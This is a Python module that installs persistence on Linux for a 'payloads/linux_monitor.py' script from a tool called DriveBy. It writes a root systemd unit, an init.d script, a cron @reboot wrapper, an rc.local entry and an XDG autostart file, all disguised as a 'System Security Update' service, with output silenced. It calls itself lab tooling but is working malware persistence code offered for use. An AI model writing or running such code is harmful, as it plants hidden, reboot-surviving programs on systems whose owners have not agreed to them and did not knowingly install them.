#!/usr/bin/env python3
"""
Linux Persistence Module
Ensures DriveBy monitoring processes restart after shutdown/restart (best-effort in controlled labs).
All operations are wrapped to avoid crashing when permissions or tools are missing.
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path
from typing import List


class LinuxPersistence:
    def __init__(self):
        self.script_path = (Path(__file__).resolve().parent.parent / "payloads" / "linux_monitor.py")
        # Use a consistent service name (hyphens are fine in unit file names)
        self.service_name = "system-security-update"

    # ----------------------
    # Systemd (modern Linux)
    # ----------------------
    def create_systemd_service(self) -> bool:
        """Create systemd service for persistence."""
        try:
            if shutil.which("systemctl") is None:
                print(" systemctl not available; skipping systemd persistence")
                return False

            service_file = f"/etc/systemd/system/{self.service_name}.service"
            service_content = f"""[Unit]
Description=System Security Update Service
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {self.script_path}
Restart=always
RestartSec=30
User=root
Group=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""

            with open(service_file, "w", encoding="utf-8") as f:
                f.write(service_content)

            # Reload systemd and enable service
            subprocess.run(["systemctl", "daemon-reload"], check=False, capture_output=True)
            subprocess.run(["systemctl", "enable", self.service_name], check=False, capture_output=True)
            subprocess.run(["systemctl", "start", self.service_name], check=False, capture_output=True)

            print(" Systemd service persistence attempted")
            return True
        except Exception as e:
            print(f" Systemd service persistence failed: {e}")
            return False

    # ----------------------
    # SysV init (older Linux)
    # ----------------------
    def create_init_d_service(self) -> bool:
        """Create init.d service for older systems."""
        try:
            init_dir = "/etc/init.d"
            if not os.path.isdir(init_dir):
                print(" /etc/init.d not present; skipping init.d persistence")
                return False

            init_file = f"{init_dir}/{self.service_name}"
            init_script = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {self.service_name}
# Required-Start:    $network $local_fs $remote_fs
# Required-Stop:     $network $local_fs $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Security Update Service
# Description:       System Security Update Service
### END INIT INFO

DAEMON_NAME="{self.service_name}"
DAEMON_PATH="/usr/bin/python3"
DAEMON_OPTS="{self.script_path}"
PIDFILE="/var/run/$DAEMON_NAME.pid"

case "$1" in
  start)
    echo "Starting $DAEMON_NAME"
    $DAEMON_PATH $DAEMON_OPTS > /dev/null 2>&1 & echo $! > $PIDFILE
    ;;
  status)
    if [ -f $PIDFILE ]; then
      PID=`cat $PIDFILE`
      if ps -p $PID > /dev/null 2>&1; then
        echo "Running"
      else
        echo "Process dead but pidfile exists"
      fi
    else
      echo "Service not running"
    fi
    ;;
  stop)
    echo "Stopping $DAEMON_NAME"
    if [ -f $PIDFILE ]; then
      PID=`cat $PIDFILE`
      kill -HUP $PID 2>/dev/null || true
      rm -f $PIDFILE
    fi
    ;;
  restart)
    $0 stop
    $0 start
    ;;
  *)
    echo "Usage: $0 {{start|stop|status|restart}}"
    exit 1
    ;;
esac

exit 0
"""

            with open(init_file, "w", encoding="utf-8") as f:
                f.write(init_script)
            os.chmod(init_file, 0o755)

            # Enable service at boot and start (best-effort)
            try:
                subprocess.run(["update-rc.d", self.service_name, "defaults"], check=False, capture_output=True)
            except Exception:
                pass
            try:
                subprocess.run(["service", self.service_name, "start"], check=False, capture_output=True)
            except Exception:
                pass

            print(" Init.d service persistence attempted")
            return True
        except Exception as e:
            print(f" Init.d service persistence failed: {e}")
            return False

    # ----------------------
    # Cron
    # ----------------------
    def create_cron_wrapper(self) -> str:
        """Create cron wrapper script."""
        wrapper_path = "/tmp/system_security_wrapper.sh"
        try:
            wrapper_content = f"""#!/bin/bash
cd "{Path(__file__).resolve().parent.parent}"
while true; do
  python3 "{self.script_path}" > /dev/null 2>&1
  sleep 30
done
"""
            with open(wrapper_path, "w", encoding="utf-8") as f:
                f.write(wrapper_content)
            os.chmod(wrapper_path, 0o755)
            return wrapper_path
        except Exception:
            return ""

    def create_cron_persistence(self) -> bool:
        """Create cron job for persistence."""
        try:
            if shutil.which("crontab") is None:
                print(" crontab not available; skipping cron persistence")
                return False

            wrapper_script = self.create_cron_wrapper()
            if not wrapper_script:
                print(" Failed to create cron wrapper")
                return False

            cron_entry = f"@reboot {wrapper_script}\n"
            try:
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                current_cron = result.stdout if result.returncode == 0 else ""
            except Exception:
                current_cron = ""

            if wrapper_script not in current_cron:
                new_cron = current_cron + cron_entry
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new_cron)
                if proc.returncode != 0:
                    print(" Failed to install crontab entry")
                    return False

            print(" Cron persistence attempted")
            return True
        except Exception as e:
            print(f" Cron persistence failed: {e}")
            return False

    # ----------------------
    # rc.local
    # ----------------------
    def create_rc_wrapper(self) -> str:
        """Create rc.local wrapper script."""
        wrapper_path = "/tmp/system_security_rc.sh"
        try:
            wrapper_content = f"""#!/bin/bash
cd "{Path(__file__).resolve().parent.parent}"
nohup python3 "{self.script_path}" > /dev/null 2>&1 &
"""
            with open(wrapper_path, "w", encoding="utf-8") as f:
                f.write(wrapper_content)
            os.chmod(wrapper_path, 0o755)
            return wrapper_path
        except Exception:
            return ""

    def create_rc_local_persistence(self) -> bool:
        """Append to /etc/rc.local to start on boot (if rc.local is in use)."""
        try:
            rc_local_path = "/etc/rc.local"
            wrapper_script = self.create_rc_wrapper()
            if not wrapper_script:
                print(" Failed to create rc.local wrapper")
                return False

            # Ensure file exists and is executable
            if not os.path.exists(rc_local_path):
                with open(rc_local_path, "w", encoding="utf-8") as f:
                    f.write("#!/bin/bash\nexit 0\n")
                os.chmod(rc_local_path, 0o755)

            with open(rc_local_path, "r", encoding="utf-8") as f:
                content = f.read()

            if wrapper_script in content:
                print(" rc.local entry already present")
                return True

            if "exit 0" in content:
                new_content = content.replace("exit 0", f"{wrapper_script} &\nexit 0")
            else:
                new_content = content + f"\n{wrapper_script} &\n"

            with open(rc_local_path, "w", encoding="utf-8") as f:
                f.write(new_content)

            print(" rc.local persistence attempted")
            return True
        except Exception as e:
            print(f" rc.local persistence failed: {e}")
            return False

    # ----------------------
    # XDG autostart (user session)
    # ----------------------
    def create_autostart_persistence(self) -> bool:
        """Create XDG autostart entry for user sessions."""
        try:
            autostart_dir = Path.home() / ".config" / "autostart"
            autostart_dir.mkdir(parents=True, exist_ok=True)

            desktop_file = autostart_dir / "system-security-update.desktop"
            desktop_content = f"""[Desktop Entry]
Type=Application
Name=System Security Update
Exec=python3 {self.script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            with open(desktop_file, "w", encoding="utf-8") as f:
                f.write(desktop_content)

            print(" XDG autostart persistence attempted")
            return True
        except Exception as e:
            print(f" XDG autostart persistence failed: {e}")
            return False

    # ----------------------
    # Orchestrators
    # ----------------------
    def install_all_persistence(self) -> bool:
        """Install multiple persistence mechanisms based on environment."""
        results: List[bool] = []
        print(" Installing Linux persistence mechanisms...")

        # Prefer systemd if available
        if shutil.which("systemctl"):
            results.append(self.create_systemd_service())
        elif os.path.exists("/etc/init.d"):
            results.append(self.create_init_d_service())

        # Additional mechanisms
        if shutil.which("crontab"):
            results.append(self.create_cron_persistence())
        results.append(self.create_rc_local_persistence())
        results.append(self.create_autostart_persistence())

        successful = sum(1 for r in results if r)
        total = len(results)
        print(f" Linux persistence: {successful}/{total} methods attempted successfully")
        return successful > 0

    def remove_persistence(self) -> bool:
        """Remove all persistence mechanisms (best-effort)."""
        try:
            # systemd
            try:
                if shutil.which("systemctl"):
                    subprocess.run(["systemctl", "stop", self.service_name], capture_output=True)
                    subprocess.run(["systemctl", "disable", self.service_name], capture_output=True)
                    unit_path = f"/etc/systemd/system/{self.service_name}.service"
                    if os.path.exists(unit_path):
                        os.remove(unit_path)
                    subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            except Exception:
                pass

            # init.d
            try:
                init_file = f"/etc/init.d/{self.service_name}"
                if os.path.exists(init_file):
                    subprocess.run(["service", self.service_name, "stop"], capture_output=True)
                    subprocess.run(["update-rc.d", self.service_name, "remove"], capture_output=True)
                    os.remove(init_file)
            except Exception:
                pass

            # cron
            try:
                if shutil.which("crontab"):
                    result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                    if result.returncode == 0:
                        lines = result.stdout.splitlines()
                        filtered = [ln for ln in lines if "system_security_wrapper.sh" not in ln]
                        new_cron = "\n".join(filtered) + ("\n" if filtered else "")
                        proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                        proc.communicate(input=new_cron)
                # remove wrapper scripts
                for wrapper in ["/tmp/system_security_wrapper.sh", "/tmp/system_security_rc.sh"]:
                    try:
                        if os.path.exists(wrapper):
                            os.remove(wrapper)
                    except Exception:
                        pass
            except Exception:
                pass

            # rc.local
            try:
                rc_local_path = "/etc/rc.local"
                if os.path.exists(rc_local_path):
                    with open(rc_local_path, "r", encoding="utf-8") as f:
                        content = f.read()
                    lines = content.splitlines()
                    filtered_lines = [ln for ln in lines if "system_security_rc.sh" not in ln]
                    new_content = "\n".join(filtered_lines) + ("\n" if filtered_lines else "")
                    with open(rc_local_path, "w", encoding="utf-8") as f:
                        f.write(new_content)
            except Exception:
                pass

            # XDG autostart
            try:
                desktop_file = Path.home() / ".config" / "autostart" / "system-security-update.desktop"
                if desktop_file.exists():
                    desktop_file.unlink()
            except Exception:
                pass

            print(" Linux persistence removal attempted")
            return True
        except Exception as e:
            print(f" Error removing persistence: {e}")
            return False


# Optional CLI usage for this module directly
if __name__ == "__main__":
    persistence = LinuxPersistence()
    if len(sys.argv) > 1 and sys.argv[1] == "remove":
        persistence.remove_persistence()
    else:
        persistence.install_all_persistence()
